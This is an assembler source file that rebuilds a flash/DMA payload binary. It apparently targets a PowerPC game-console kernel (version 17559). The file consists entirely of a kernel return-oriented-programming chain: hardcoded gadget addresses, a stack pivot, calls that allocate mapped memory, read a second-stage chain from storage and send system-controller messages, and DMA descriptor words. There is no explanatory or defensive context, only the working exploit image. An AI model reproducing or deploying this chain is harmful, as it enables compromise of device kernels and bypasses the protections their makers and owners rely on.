/* Lossless clean-room reconstruction of Flash/FlashDmaPayload.bin.
 * Sparse 17559-kernel ROP/data image; it contains no sequential PPC code.
 */
.section .text
.balign 4
.set FLASH_DMA_BASE, 0x801ca000
.set STAGE2_ROP_BASE, 0x7a020000
.set CF_R6, 0x27272727
.set CF_R5, 0x28282828
.set CF_R4, 0x29292929
.set CF_R3, 0x30303030
.set CF_R3_DEFAULT, 0x31313131
.set CF_R8, 0x25252525
.set MiAllocateMappedMemory, 0x80080d28
.set MmSystemPfnRegion, 0x80170880
.set KeSetCurrentStackPointers, 0x80075e70
.set HalSendSMCMessage, 0x80067f48
.set KeStallExecutionProcessor, 0x80073484
.set IoSynchronousFsdRequest, 0x8006b928
.set restgprlr_25, 0x80061b70
.set restgprlr_29, 0x800619b4
.set restgprlr_31, 0x800664b0
.set stw_r3, 0x800d986c
.set mr_r31_to_r3, 0x800661e4
.set mr_r31_to_r11, 0x800c8748
.set call_func_dispatch, 0x8007b0ac
.set stack_pivot_entry, 0x800d27a0
.set call_func_preload, 0x800f68cc
.set load_add_store_r3_r4_on_r11, 0x80129b7c
.set lwz_r3_off_r3, 0x80130f60
.set lwz_r11_off_r3, 0x80131e38
.set stw_r11_on_r3, 0x800c6690

.org 0x01f0
entry_stack_record:
    .long FLASH_DMA_BASE + 0x200
.org 0x01f8
    .long KeSetCurrentStackPointers
.org 0x0250
rop_chain:
    .long CF_R6
.org 0x0254
    .long CF_R6
.org 0x0258
    .long CF_R5
.org 0x025c
    .long CF_R5
.org 0x0260
    .long CF_R4
.org 0x0264
    .long CF_R4
.org 0x0274
    .long FLASH_DMA_BASE + 0xdf0
.org 0x0278
    .long stack_pivot_entry
.org 0x02d0
    .long CF_R6
.org 0x02d4
    .long CF_R6
.org 0x02d8
    .long CF_R5
.org 0x02dc
    .long CF_R5
.org 0x02e0
    .long CF_R4
.org 0x02e4
    .long CF_R4
.org 0x02f4
    .long FLASH_DMA_BASE + 0xde4
.org 0x02f8
    .long stack_pivot_entry
.org 0x0350
    .long CF_R6
.org 0x0354
    .long CF_R6
.org 0x0358
    .long CF_R5
.org 0x035c
    .long CF_R5
.org 0x0360
    .long CF_R4
.org 0x0364
    .long CF_R4
.org 0x0368
    .long CF_R3
.org 0x036c
    .long CF_R3
.org 0x0370
    .long CF_R3_DEFAULT
.org 0x0374
    .long CF_R3_DEFAULT
.org 0x0378
    .long restgprlr_31
.org 0x03d4
    .long restgprlr_31
.org 0x03d8
    .long mr_r31_to_r11
.org 0x0438
    .long CF_R3
.org 0x043c
    .long CF_R3
.org 0x0440
    .long CF_R3_DEFAULT
.org 0x0444
    .long CF_R3_DEFAULT
.org 0x0448
    .long restgprlr_25
.org 0x04ac
    .long 2
.org 0x04b4
    .long 0x0007c000
.org 0x04bc
    .long 4
.org 0x04c4
    .long 0x11
.org 0x04c8
    .long CF_R3
.org 0x04cc
    .long CF_R3
.org 0x04d4
    .long MmSystemPfnRegion
.org 0x04d8
    .long call_func_preload
.org 0x0534
    .long MiAllocateMappedMemory
.org 0x0538
    .long call_func_dispatch
.org 0x0594
    .long FLASH_DMA_BASE + 0xe3c
.org 0x0598
    .long mr_r31_to_r3
.org 0x0604
    .long lwz_r3_off_r3
.org 0x0608
    .long call_func_dispatch
.org 0x0664
    .long FLASH_DMA_BASE + 0xe68
.org 0x0668
    .long stw_r3
.org 0x06c4
    .long restgprlr_31
.org 0x06c8
    .long mr_r31_to_r11
.org 0x0728
    .long CF_R3
.org 0x072c
    .long CF_R3
.org 0x0730
    .long CF_R3_DEFAULT
.org 0x0734
    .long CF_R3_DEFAULT
.org 0x0738
    .long restgprlr_29
.org 0x0794
    .long 0x00000bc4
.org 0x0798
    .long CF_R3
.org 0x079c
    .long CF_R3
.org 0x07a0
    .long CF_R3_DEFAULT
.org 0x07a4
    .long CF_R3_DEFAULT
.org 0x07a8
    .long call_func_preload + 0x10
.org 0x0804
    .long 0x801c7f80
.org 0x0808
    .long mr_r31_to_r11
.org 0x0868
    .long CF_R3
.org 0x086c
    .long CF_R3
.org 0x0874
    .long load_add_store_r3_r4_on_r11
.org 0x0878
    .long call_func_dispatch
.org 0x08d4
    .long 0x801a614c
.org 0x08d8
    .long mr_r31_to_r3
.org 0x0944
    .long lwz_r11_off_r3
.org 0x0948
    .long call_func_dispatch
.org 0x09a4
    .long FLASH_DMA_BASE + 0xe38
.org 0x09a8
    .long mr_r31_to_r3
.org 0x0a14
    .long lwz_r3_off_r3
.org 0x0a18
    .long call_func_dispatch
.org 0x0a74
    .long stw_r11_on_r3
.org 0x0a78
    .long call_func_dispatch
.org 0x0ad4
    .long restgprlr_31
.org 0x0ad8
    .long mr_r31_to_r11
.org 0x0b38
    .long CF_R3
.org 0x0b3c
    .long CF_R3
.org 0x0b40
    .long CF_R3_DEFAULT
.org 0x0b44
    .long CF_R3_DEFAULT
.org 0x0b48
    .long restgprlr_25
.org 0x0ba0
    .long CF_R8
.org 0x0ba4
    .long CF_R8
.org 0x0bac
    .long FLASH_DMA_BASE + 0xe60
.org 0x0bb4
    .long 0x0007c000
.org 0x0bbc
    .long STAGE2_ROP_BASE
.org 0x0bc4
    .long 0x41414141
.org 0x0bc8
    .long CF_R3
.org 0x0bcc
    .long CF_R3
.org 0x0bd4
    .long 2
.org 0x0bd8
    .long call_func_preload
.org 0x0c34
    .long IoSynchronousFsdRequest
.org 0x0c38
    .long call_func_dispatch
.org 0x0c94
    .long restgprlr_31
.org 0x0c98
    .long mr_r31_to_r11
.org 0x0cf8
    .long CF_R3
.org 0x0cfc
    .long CF_R3
.org 0x0d00
    .long CF_R3_DEFAULT
.org 0x0d04
    .long CF_R3_DEFAULT
.org 0x0d08
    .long restgprlr_25
.org 0x0d60
    .long CF_R8
.org 0x0d64
    .long CF_R8
.org 0x0d6c
    .long STAGE2_ROP_BASE
.org 0x0d74
    .long 0x7a09c000
.org 0x0d78
    .long CF_R5
.org 0x0d7c
    .long CF_R5
.org 0x0d84
    .long STAGE2_ROP_BASE
.org 0x0d88
    .long CF_R3
.org 0x0d8c
    .long CF_R3
.org 0x0d94
    .long STAGE2_ROP_BASE + 0x2000
.org 0x0d98
    .long call_func_preload
.org 0x0df4
    .long KeSetCurrentStackPointers
.org 0x0df8
    .long call_func_dispatch
.org 0x0e00
smc_and_dma_control_data:
    .long FLASH_DMA_BASE + 0xe30
.org 0x0e08
    .long HalSendSMCMessage
.org 0x0e0c
    .long 0x00004e20
.org 0x0e14
    .long KeStallExecutionProcessor
.org 0x0e18
    .long FLASH_DMA_BASE + 0xe40
.org 0x0e20
    .long HalSendSMCMessage
.org 0x0e24
    .long FLASH_DMA_BASE + 0xe50
.org 0x0e2c
    .long HalSendSMCMessage
.org 0x0e30
    .long 0x99ffff00
.org 0x0e40
    .long 0xa0010000
.org 0x0e50
    .long 0xa0000000
.org 0x0e64
    .long 0x00004000
.org 0x0e6c
    .long FLASH_DMA_BASE
.org 0x1400
dma_descriptor_words:
    .long 0x00b11c00
.org 0x1404
    .long 0x20000000
.org 0x1408
    .long 0x20b11c00
.org 0x140c
    .long 0xc0010000
.org 0x1410
    .long 0x40388700
.org 0x1414
    .long 0x20000080
.org 0x1600
scratch_sector:
    .fill 128, 4, 0x41414141
.org 0x4000
payload_end:
